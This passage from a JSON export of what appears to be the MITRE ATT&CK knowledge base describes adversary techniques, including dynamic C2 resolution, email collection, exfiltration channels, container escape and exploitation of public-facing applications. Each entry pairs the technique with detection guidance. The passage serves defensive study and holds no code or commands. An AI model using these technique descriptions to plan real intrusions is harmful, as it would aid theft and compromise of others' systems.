                "description": "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
                "url": "https://attack.mitre.org/techniques/T1568",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Detecting dynamically generated C2 can be challenging due to the number of different algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There are multiple approaches to detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more (Citation: Data Driven Security DGA). CDN domains may trigger these detections due to the format of their domain names. In addition to detecting algorithm generated domains based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1114",
                "name": "Email Collection",
                "description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. ",
                "url": "https://attack.mitre.org/techniques/T1114",
                "data_sources": [
                    "File: File Access",
                    "Network Traffic: Network Connection Creation",
                    "Logon Session: Logon Session Creation",
                    "Command: Command Execution",
                    "Application Log: Application Log Content"
                ],
                "detection": "There are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.\n\nFile access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.\n\nMonitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nDetection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.\n\nAuto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include <code>X-MS-Exchange-Organization-AutoForwarded</code> set to true, <code>X-MailFwdBy</code> and <code>X-Forwarded-To</code>. The <code>forwardingSMTPAddress</code> parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the <code>X-MS-Exchange-Organization-AutoForwarded</code> header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Office 365",
                    "Google Workspace"
                ],
                "tactics": [
                    "collection"
                ]
            },
            {
                "id": "T1573",
                "name": "Encrypted Channel",
                "description": "Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
                "url": "https://attack.mitre.org/techniques/T1573",
                "data_sources": [
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "command-and-control"
                ]
            },
            {
                "id": "T1499",
                "name": "Endpoint Denial of Service",
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n",
                "url": "https://attack.mitre.org/techniques/T1499",
                "data_sources": [
                    "Sensor Health: Host Status",
                    "Application Log: Application Log Content",
                    "Network Traffic: Network Traffic Content",
                    "Network Traffic: Network Traffic Flow"
                ],
                "detection": "Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\n\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.\n\nExternally monitor the availability of services that may be targeted by an Endpoint DoS.",
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace",
                    "Containers"
                ],
                "tactics": [
                    "impact"
                ]
            },
            {
                "id": "T1611",
                "name": "Escape to Host",
                "description": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host�s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host, and utilizing a privileged container to run commands on the underlying host.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20) Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.",
                "url": "https://attack.mitre.org/techniques/T1611",
                "data_sources": [
                    "Container: Container Creation",
                    "Process: OS API Execution",
                    "Process: Process Creation"
                ],
                "detection": "Monitor for the deployment of suspicious or unknown container images and pods in your environment, particularly containers running as root. Additionally, monitor for unexpected usage of syscalls such as <code>mount</code> (as well as resulting process activity) that may indicate an attempt to escape from a privileged container to host. In Kubernetes, monitor for cluster-level events associated with changing containers' volume configurations.",
                "permissions": [
                    "Administrator",
                    "User",
                    "root"
                ],
                "platforms": [
                    "Windows",
                    "Linux",
                    "Containers"
                ],
                "tactics": [
                    "privilege-escalation"
                ]
            },
            {
                "id": "T1585",
                "name": "Establish Accounts",
                "description": "Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1)",
                "url": "https://attack.mitre.org/techniques/T1585",
                "detection": "Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",
                "platforms": [
                    "PRE"
                ],
                "tactics": [
                    "resource-development"
                ]
            },
            {
                "id": "T1546",
                "name": "Event Triggered Execution",
                "description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. \n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ",
                "url": "https://attack.mitre.org/techniques/T1546",
                "data_sources": [
                    "Process: Process Creation",
                    "Windows Registry: Windows Registry Key Modification",
                    "Command: Command Execution",
                    "File: File Creation",
                    "File: File Modification",
                    "WMI: WMI Creation",
                    "File: File Metadata",
                    "Module: Module Load"
                ],
                "detection": "Monitoring for additions or modifications of mechanisms that could be used to trigger event-based execution, especially the addition of abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network. Also look for changes that do not line up with updates, patches, or other planned administrative activity. \n\nThese mechanisms may vary by OS, but are typically stored in central repositories that store configuration information such as the Windows Registry, Common Information Model (CIM), and/or specific named files, the last of which can be hashed and compared to known good values. \n\nMonitor for processes, API/System calls, and other common ways of manipulating these event repositories. \n\nTools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.  \n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement. ",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "privilege-escalation",
                    "persistence"
                ]
            },
            {
                "id": "T1480",
                "name": "Execution Guardrails",
                "description": "Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary�s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)\n\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",
                "url": "https://attack.mitre.org/techniques/T1480",
                "data_sources": [
                    "Process: Process Creation",
                    "Command: Command Execution"
                ],
                "detection": "Detecting the use of guardrails may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1048",
                "name": "Exfiltration Over Alternative Protocol",
                "description": "Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\n[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) ",
                "url": "https://attack.mitre.org/techniques/T1048",
                "data_sources": [
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content",
                    "File: File Access",
                    "Command: Command Execution"
                ],
                "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "exfiltration"
                ]
            },
            {
                "id": "T1041",
                "name": "Exfiltration Over C2 Channel",
                "description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
                "url": "https://attack.mitre.org/techniques/T1041",
                "data_sources": [
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content",
                    "File: File Access",
                    "Command: Command Execution"
                ],
                "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "exfiltration"
                ]
            },
            {
                "id": "T1011",
                "name": "Exfiltration Over Other Network Medium",
                "description": "Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.\n\nAdversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network",
                "url": "https://attack.mitre.org/techniques/T1011",
                "data_sources": [
                    "Network Traffic: Network Connection Creation",
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content",
                    "File: File Access",
                    "Command: Command Execution"
                ],
                "detection": "Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.\n\nMonitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "exfiltration"
                ]
            },
            {
                "id": "T1052",
                "name": "Exfiltration Over Physical Medium",
                "description": "Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
                "url": "https://attack.mitre.org/techniques/T1052",
                "data_sources": [
                    "Process: Process Creation",
                    "File: File Access",
                    "Drive: Drive Creation",
                    "Command: Command Execution"
                ],
                "detection": "Monitor file access on removable media. Detect processes that execute when removable media are mounted.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "exfiltration"
                ]
            },
            {
                "id": "T1567",
                "name": "Exfiltration Over Web Service",
                "description": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\n\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
                "url": "https://attack.mitre.org/techniques/T1567",
                "data_sources": [
                    "Network Traffic: Network Traffic Flow",
                    "Network Traffic: Network Traffic Content",
                    "File: File Access",
                    "Command: Command Execution"
                ],
                "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.",
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ],
                "tactics": [
                    "exfiltration"
                ]
            },
            {
                "id": "T1190",
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL)(Citation: NVD CVE-2016-6662), standard services (like SMB(Citation: CIS Multiple SMB Vulnerabilities) or SSH), network device administration and management protocols (like SNMP and Smart Install(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)), and any other applications with Internet accessible open sockets, such as web servers and related services.(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may include [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211). \n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "url": "https://attack.mitre.org/techniques/T1190",
                "data_sources": [
                    "Application Log: Application Log Content",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.",
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Network",
                    "Linux",
                    "macOS",
                    "Containers"
                ],
                "tactics": [
                    "initial-access"
                ]
            },
            {
                "id": "T1203",
                "name": "Exploitation for Client Execution",
                "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "url": "https://attack.mitre.org/techniques/T1203",
                "detection": "Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "execution"
                ]
            },
            {
                "id": "T1212",
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.�Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "url": "https://attack.mitre.org/techniques/T1212",
                "detection": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. Credential resources obtained through exploitation may be detectable in use if they are not normally used or seen.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "credential-access"
                ]
            },
            {
                "id": "T1211",
                "name": "Exploitation for Defense Evasion",
                "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.�Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.",
                "url": "https://attack.mitre.org/techniques/T1211",
                "detection": "Exploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "defense-evasion"
                ]
            },
            {
                "id": "T1068",
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "url": "https://attack.mitre.org/techniques/T1068",
                "data_sources": [
                    "Driver: Driver Load"
                ],
                "detection": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery. Consider monitoring for the presence or loading (ex: Sysmon Event ID 6) of known vulnerable drivers that adversaries may drop and exploit to execute code in kernel mode.(Citation: Microsoft Driver Block Rules)\n\nHigher privileges are often necessary to perform additional actions such as some methods of [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Look for additional activity that may indicate an adversary has gained higher privileges.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ],
                "tactics": [
                    "privilege-escalation"
                ]
            },
            {
                "id": "T1210",
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.�A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Scanning](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "url": "https://attack.mitre.org/techniques/T1210",
                "data_sources": [
                    "Application Log: Application Log Content",
                    "Network Traffic: Network Traffic Content"
                ],
                "detection": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "tactics": [
                    "lateral-movement"
                ]
            },
            {
                "id": "T1133",
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) can also be used externally.\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn�t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "url": "https://attack.mitre.org/techniques/T1133",
                "data_sources": [
                    "Application Log: Application Log Content",
                    "Logon Session: Logon Session Metadata",
                    "Network Traffic: Network Traffic Flow"
                ],
                "detection": "Follow best practices for detecting adversary use of [Valid Accounts](https://attack.mitre.org/techniques/T1078) for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.\n\nWhen authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application.",
                "permissions": [
                    "User"
                ],
                "platforms": [
                    "Windows",
                    "Linux",
                    "Containers"
                ],
                "tactics": [
                    "persistence",
                    "initial-access"
                ]
            },
            {
